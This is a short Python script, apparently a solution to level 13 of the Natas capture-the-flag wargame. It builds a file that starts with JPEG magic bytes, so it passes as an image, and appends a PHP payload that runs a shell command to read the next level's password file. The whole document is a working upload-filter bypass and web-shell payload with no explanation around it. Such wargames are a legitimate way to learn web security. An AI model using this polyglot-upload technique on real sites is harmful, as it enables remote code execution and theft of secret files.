#  goal is to make text file with FFD8 as the very first byte

with open('natas13file', 'wb') as f:
    f.write(bytes([int(x, 16) for x in ['FF', 'D8', 'FF', 'E0']]))

    f.write(b'<?php system("cat /etc/natas_webpass/natas14");')
